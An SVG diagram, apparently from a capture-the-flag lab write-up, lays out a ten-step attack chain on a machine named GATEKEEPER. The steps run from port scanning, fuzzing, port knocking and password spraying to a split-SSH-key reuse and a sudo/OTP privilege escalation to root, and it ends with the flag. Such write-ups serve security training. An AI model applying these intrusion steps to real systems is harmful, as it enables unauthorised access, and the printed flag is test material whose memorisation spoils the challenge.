<svg xmlns="http://www.w3.org/2000/svg" width="1100" height="820" viewBox="0 0 1100 820">
  <rect width="1100" height="820" fill="#0d1117"/>
  <text x="550" y="42" fill="#58a6ff" font-family="monospace" font-size="26" font-weight="bold" text-anchor="middle">GATEKEEPER — Cadena de Ataque (Black-Box)</text>

  <!-- Step 1 -->
  <rect x="40" y="70" width="1020" height="52" rx="8" fill="#161b22" stroke="#30363d"/>
  <text x="60" y="92" fill="#c9d1d9" font-family="monospace" font-size="15">[1] nmap -p- 172.17.0.2</text>
  <text x="60" y="112" fill="#8b949e" font-family="monospace" font-size="13">80 open | 3306/5432 señuelos | 33333 filtered (firewall)</text>

  <!-- Step 2 -->
  <rect x="40" y="140" width="1020" height="52" rx="8" fill="#161b22" stroke="#30363d"/>
  <text x="60" y="162" fill="#c9d1d9" font-family="monospace" font-size="15">[2] ffuf (prefijo .) en /backups/</text>
  <text x="60" y="182" fill="#8b949e" font-family="monospace" font-size="13">/backups/.env = GKP1337P2048P4096TRON  (semilla de knock)</text>

  <!-- Step 3 -->
  <rect x="40" y="210" width="1020" height="52" rx="8" fill="#161b22" stroke="#30363d"/>
  <text x="60" y="232" fill="#c9d1d9" font-family="monospace" font-size="15">[3] Análisis de banners MySQL/PG</text>
  <text x="60" y="252" fill="#8b949e" font-family="monospace" font-size="13">sin handshake → honeytokens → se descartan</text>

  <!-- Step 4 highlight -->
  <rect x="40" y="280" width="1020" height="62" rx="8" fill="#1c2d1c" stroke="#3fb950" stroke-width="2"/>
  <text x="60" y="302" fill="#3fb950" font-family="monospace" font-size="15" font-weight="bold">[4] Port knocking  1337 → 2048 → 4096</text>
  <text x="60" y="324" fill="#8b949e" font-family="monospace" font-size="13">abre el puerto 33333 (SSH OpenSSH_8.9p1)</text>

  <!-- Step 5 -->
  <rect x="40" y="360" width="1020" height="52" rx="8" fill="#161b22" stroke="#30363d"/>
  <text x="60" y="382" fill="#c9d1d9" font-family="monospace" font-size="15">[5] Password spray dirigido (user "mauricio" del audit log)</text>
  <text x="60" y="402" fill="#8b949e" font-family="monospace" font-size="13">credencial débil → login SSH como mauricio (uid 1000)</text>

  <!-- Step 6 -->
  <rect x="40" y="430" width="1020" height="52" rx="8" fill="#161b22" stroke="#30363d"/>
  <text x="60" y="452" fill="#c9d1d9" font-family="monospace" font-size="15">[6] ls /home  (como mauricio)</text>
  <text x="60" y="472" fill="#8b949e" font-family="monospace" font-size="13">descubre developer, mauricio, sysadmin</text>

  <!-- Step 7 highlight -->
  <rect x="40" y="500" width="1020" height="62" rx="8" fill="#1c2d1c" stroke="#3fb950" stroke-width="2"/>
  <text x="60" y="522" fill="#3fb950" font-family="monospace" font-size="15" font-weight="bold">[7] Reconstruir clave dividida (world-readable)</text>
  <text x="60" y="544" fill="#8b949e" font-family="monospace" font-size="13">.ssh_part1 + Desktop/.ssh_part2 → login como sysadmin (uid 1002)</text>

  <!-- Step 8 -->
  <rect x="40" y="580" width="1020" height="52" rx="8" fill="#161b22" stroke="#30363d"/>
  <text x="60" y="602" fill="#c9d1d9" font-family="monospace" font-size="15">[8] sudo -l  →  NOPASSWD: /usr/local/bin/auth_root</text>
  <text x="60" y="622" fill="#8b949e" font-family="monospace" font-size="13">único privilegio de sysadmin</text>

  <!-- Step 9 highlight -->
  <rect x="40" y="650" width="1020" height="62" rx="8" fill="#2d1c1c" stroke="#f85149" stroke-width="2"/>
  <text x="60" y="672" fill="#f85149" font-family="monospace" font-size="15" font-weight="bold">[9] OTP=$(cat /tmp/.current_otp) ; ./.system_auth $OTP</text>
  <text x="60" y="694" fill="#8b949e" font-family="monospace" font-size="13">marker en /tmp → sudo auth_root → exec /bin/bash  (root)</text>

  <!-- Step 10 -->
  <rect x="40" y="730" width="1020" height="56" rx="8" fill="#1c2d1c" stroke="#3fb950" stroke-width="2"/>
  <text x="60" y="755" fill="#3fb950" font-family="monospace" font-size="16" font-weight="bold">[10] cat /root/flag.txt</text>
  <text x="60" y="777" fill="#c9d1d9" font-family="monospace" font-size="14">GATEKEEPER{0TP_4uth3nt1c4t10n_M4st3r_2026}</text>
</svg>
